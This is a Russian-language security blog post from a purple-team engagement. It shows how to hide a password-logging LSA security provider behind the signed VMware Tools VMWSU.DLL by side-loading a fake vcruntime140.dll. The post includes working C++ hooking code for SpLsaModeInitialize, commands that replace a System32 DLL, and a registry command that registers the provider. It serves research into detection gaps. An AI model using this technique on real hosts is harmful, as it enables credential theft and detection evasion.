---
layout: post
title: "From DLL Side Load to Malicious SSP [Pentest Awards 2023]"
date: 2024-05-19 18:00:00 +0300
author: snovvcrash
tags: [pentest-awards, xakep-ru, purple-teaming, dll-hijacking, dll-side-loading, ssp, mimilib]
---

[//]: # (2023-09-27)

Нескучный байпас средств защиты подразумевает разглашение приватного кода, который от этого, скорее всего, обесценится. Поэтому я решил рассказать интересный кейс из опыта участия в Purple Team. Нам удалось надурить кастомное правило СЗИ, нацеленное на мониторинг зловредных SSP-модулей.

<!--cut-->

<p align="right">
  <a href="https://award.awillix.ru/2023"><img src="https://img.shields.io/badge/Awillix-Pentest%20Awards-087fff?style=flat-square" alt="award-awillix-badge.svg" /></a>
  <a href="https://xakep.ru/2023/09/27/pentest-award-bypass/#toc04."><img src="https://img.shields.io/badge/%5d%5b-%d0%a5%d0%b0%d0%ba%d0%b5%d1%80-red?style=flat-square" alt="xakep-badge.svg" /></a>
</p>

Я считаю, что прямые манипуляции с памятью LSASS давно утратили свою эффективность из‑за того, что есть намного менее инвазивные методики получения кредов на внутряках и редтимах. Описанный далее случай претендует скорее на забавную «байку из склепа», нежели на серьезную технику зрелых злоумышленников. Однако тут присутствует мини‑ресерч, полезный для обучения.

Итак, пришли к нам представители синей команды и спросили, как может хацкер спрятать свой малварный SSP-провайдер вроде `mimilib.dll` от взгляда мониторинга, оставаясь при этом корректно зарегистрированным в системе. Отталкиваясь от того, что детект основывался на отслеживании состояния ключа `HKLM\SYSTEM\currentcontrolset\control\lsa\Security Packages` и проверки соответствующих DLL на наличие цифровых подписей, мы решили поресерчить существующие либы на предмет уязвимости к DLL Side-Loading.

> **WARNING**
>
> Статья имеет ознакомительный характер и предназначена для специалистов по безопасности, проводящих тестирование в рамках контракта. Автор не несет ответственности за любой вред, причиненный с применением изложенной информации. Распространение вредоносных программ, нарушение работы систем и нарушение тайны переписки преследуются по закону.

[![banner.png](/assets/images/from-dll-side-load-to-malicious-ssp/banner.png)](/assets/images/from-dll-side-load-to-malicious-ssp/banner.png)
{:.center-image}

* TOC
{:toc}

# В поисках экспорта SpLsaModeInitialize

Соберем список легитимных библиотек из `C:\WINDOWS\System32\*`:

```terminal?prompt=>
PS > Get-ChildItem C:\WINDOWS\System32\ -Filter *.dll -Recurse | % { $_.FullName } > \temp\dlls.txt 
```

Далее с помощью нехитрого скрипта на Python посмотрим на их экспорты с целью найти все DLL, которые предоставляют апи [SpLsaModeInitialize](https://learn.microsoft.com/en-us/windows/win32/api/ntsecpkg/nc-ntsecpkg-splsamodeinitializefn):

```terminal?prompt=>
PS > foreach ($line in Get-Content \temp\dlls.txt) { py \tools\pe_exports.py $line | findstr /i SpLsaModeInitialize } # C:\WINDOWS\System32\cloudAP.dll: SpLsaModeInitialize @1 
# C:\WINDOWS\System32\kerberos.dll: SpLsaModeInitialize @3 
# C:\WINDOWS\System32\msv1_0.dll: SpLsaModeInitialize @3 
# C:\WINDOWS\System32\negoexts.dll: SpLsaModeInitialize @1 
# C:\WINDOWS\System32\pku2u.dll: SpLsaModeInitialize @1 
# C:\WINDOWS\System32\schannel.dll: SpLsaModeInitialize @1 
# C:\WINDOWS\System32\TSpkg.dll: SpLsaModeInitialize @1 
# C:\WINDOWS\System32\VMWSU.DLL: SpLsaModeInitialize @1 
# C:\WINDOWS\System32\wdigest.dll: SpLsaModeInitialize @7
```

Содержимое `pe_exports.py`:

```python
import sys, pefile, os

if not len(sys.argv[1:]):
  print ("Usage pe_exports.py FILE")
  exit(1)

for f in sys.argv[1:]:
    pe = pefile.PE(f)
    generate = False
    exports = []
    lib = os.path.basename(f)
    if '-gen' in sys.argv:
        generate = True
    exportSymbols = getattr(pe, 'DIRECTORY_ENTRY_EXPORT', None)
    if exportSymbols:
        for sym in exportSymbols.symbols:
            if not generate:
                try:
                    line = '{} @{}'.format(sym.name.decode(), sym.ordinal)
                except:
                    line = 'None @{}'.format(sym.ordinal)
                if sym.forwarder is not None:
                    line += ' -> {}'.format(sym.forwarder.decode())
                print('{}: {}'.format(f,line))
                continue
            if sym.name.decode() == 'DllMain': continue
            exports += ['   {name}={lib}.{name} @{ord}'.format(
                name = sym.name.decode(),
                ord = sym.ordinal,
                lib = '.'.join(lib.split('.')[:-1])
            )]

    if generate:
        print('''LIBRARY   BTREE
    EXPORTS
    {}
    '''.format('\n'.join(exports)))
```

Помимо дефолтных виндовых библиотек, в глаза сразу же бросается `C:\WINDOWS\System32\VMWSU.DLL`, которая оказалась частью пакета гостевых дополнений VMware Tools. С цифровой подписью у этой библиотеки все в норме.

[![vmwsu-dll-signature.png](/assets/images/from-dll-side-load-to-malicious-ssp/vmwsu-dll-signature.png)](/assets/images/from-dll-side-load-to-malicious-ssp/vmwsu-dll-signature.png)
{:.center-image}

# Импорты VMWSU.DLL

Теперь глянем на импорты `VMWSU.DLL`.

[![vmwsu-dll-imports.png](/assets/images/from-dll-side-load-to-malicious-ssp/vmwsu-dll-imports.png)](/assets/images/from-dll-side-load-to-malicious-ssp/vmwsu-dll-imports.png)
{:.center-image}

Как видишь, эта библиотека, скорее всего, будет пытаться подтянуть функции `vcruntime140.dll`, которые не входят в набор обязательных компонентов ОС.

# Подделка SSP и хукинг SpLsaModeInitialize

Проведем атаку DLL Side-Loading, нацеленную на подмену библиотеки `vcruntime140.dll` при загрузке `VMWSU.DLL`. Чтобы переопределить поведение экспорта `SpLsaModeInitialize`, мы воспользуемся классической техникой API-хукина.

Для начала соберем все экспорты `vcruntime140.dll` с помощью [SharpDllProxy](https://github.com/Flangvik/SharpDllProxy), чтобы наша поддельная библиотека `VMWSU.DLL` проксировала вызовы `vcruntime140.dll` к соответствующей легитимной библиотеке:

```terminal?prompt=>
Cmd > .\SharpDllProxy.exe --dll C:\windows\system32\vcruntime140.dll 
[+] Reading exports from C:\windows\system32\vcruntime140.dll... 
[+] Redirected 71 function calls from vcruntime140.dll to tmp50CA.dll 
[+] Exporting DLL C source to C:\Repos\SharpDllProxy\SharpDllProxy\bin\Debug\netcoreapp3.1\output_vcruntime140\vcruntime140_pragma.c
```

Теперь, вооружившись примером малварного SSP с [Red Team Notes](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package), а также честно позаимствовав шаблон для хукинга из проекта [ShellcodeFluctuation](https://github.com/mgeeky/ShellcodeFluctuation/blob/cb7a803493b9ce9fb5a5a3bc1c77773a60194ca4/ShellcodeFluctuation/main.cpp%23L178-L262)] (я уже использовал его в статье «[Флуктуация шелл-кода. Пишем инжектор для динамического шифрования полезной нагрузки в памяти](https://xakep.ru/2022/06/17/shellcode-fluctuation/)»), набросаем быстрый трамплин, который будет менять поведение `SpLsaModeInitialize`. Полный код доступен [у меня на GitHub](https://gist.github.com/snovvcrash/8e2e0e0b04014c61c81761e0bddbc6ea).

```cpp
bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers)
{
    uint8_t trampoline[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
        0x41, 0xFF, 0xE2                                            // jmp r10
    };

    uint64_t addr = (uint64_t)(jumpAddress);
    memcpy(&trampoline[2], &addr, sizeof(addr));

    DWORD dwSize = sizeof(trampoline);
    DWORD oldProt = 0;
    bool output = false;

    if (installHook)
    {
        if (buffers != NULL)
            memcpy(buffers->previousBytes, addressToHook, buffers->previousBytesSize);

        if (::VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &oldProt))
        {
            memcpy(addressToHook, trampoline, dwSize);
            output = true;
        }
    }
    else
    {
        dwSize = buffers->originalBytesSize;

        if (::VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &oldProt))
        {
            memcpy(addressToHook, buffers->originalBytes, dwSize);
            output = true;
        }
    }

    ::VirtualProtect(addressToHook, dwSize, oldProt, &oldProt);
    return output;
}

void NTAPI MySpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE* ppTables, PULONG pcTables)
{
    HookTrampolineBuffers buffers = { 0 };
    buffers.originalBytes = g_hookedSpLsaModeInitialize.spLsaModeInitializeStub;
    buffers.originalBytesSize = sizeof(g_hookedSpLsaModeInitialize.spLsaModeInitializeStub);

    HINSTANCE library = LoadLibraryA("VMWSU.DLL");
    FARPROC spLsaModeInitializeAddress = GetProcAddress(library, "SpLsaModeInitialize");

    fastTrampoline(false, (BYTE*)spLsaModeInitializeAddress, (void*)&MySpLsaModeInitialize, &buffers);

    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables = SecurityPackageFunctionTable;
    *pcTables = 1;

    fastTrampoline(true, (BYTE*)spLsaModeInitializeAddress, (void*)&MySpLsaModeInitialize, NULL);
}
```

Очевидно, что скопипащенный с ired.team код SSP палится всем чем можно даже в статике, однако наша цель в данном случае — не избежать детектов на диске, а найти способ сокрытия целевой библиотеки из соответствующего ключа реестра.

Компилируем как DLL с корректными экспортами, полученными с помощью `SharpDllProxy` (`output_vcruntime140\vcruntime140_pragma.c`/), и копируем результат как `C:\WINDOWS\System32\vcruntime140.dll`. Туда же кладем исходную библиотекой, предварительно переименовав в `output_vcruntime140\tmp50CA.dll`:

```terminal?prompt=>
Cmd > move \windows\system32\vcruntime140.dll \windows\system32\vcruntime140.dll.bak 
Cmd > copy output_vcruntime140\tmp50CA.dll \windows\system32\tmp50CA.dll 
Cmd > copy C:\Repos\Dll1\x64\Release\Dll1.dll \windows\system32\vcruntime140.dll 
```

Отмечу, что не обязательно класть оригинальную переименованную библиотеку `tmp50CA.dll` в `SYSTEM32` — достаточно при определении прагм с экспортами указать полный путь до либы.

Теперь добавляем `VMWSU.DLL` в качестве провайдера безопасности LSASS:

```terminal?prompt=>
Cmd > reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d 
"kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0vmwsu" /t REG_MULTI_SZ /f 
```

И вуаля — в реестре значение ключа Security Packages содержит только легитимные **подписанные** DLL, однако при подгрузке VMWSU.DLL будет загружаться `vcruntime140.dll`, которая заменит вызов `SpLsaModeInitialize` на сборщик паролей в открытом виде. При этом работоспособность системы не пострадает, так как вызовы к `vcruntime140.dll` будут проксироваться до оригинальной библиотеки.

Перезагружаемся, логинимся, проверяем файл `C:\Temp\logged-pw.txt` и, о боже, обнаруживаем в нем только что введенный пароль!

# Вывод

Мне удалось обнаружить небольшой зиродей для виртуальных машинок с навешанным VMware Tools. Несмотря на то, что этот кейс вряд ли сработает в боевых условиях, все же я считаю, что некоторые защитные средства чрезмерно доверчиво относятся к активности, исходящей от подписанных образов PE. А ведь ими тоже можно манипулировать!
